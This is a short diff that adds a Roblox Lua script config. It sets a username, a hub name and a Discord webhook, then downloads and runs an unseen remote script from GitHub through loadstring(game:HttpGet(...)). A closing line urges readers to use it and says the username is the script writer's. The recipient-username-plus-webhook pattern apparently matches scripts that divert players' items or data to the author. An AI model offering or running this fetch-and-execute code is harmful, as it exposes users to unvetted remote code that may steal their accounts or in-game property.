@@ -1,0 +1,7 @@
+_G.Username = "jamessdsz"
+_G.HubName = "Project WD"
+_G.WebhookUrl = "https://discord.gg/projectwd"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+
+must use this i buy it for 10 dollar the username is user name of the script writer
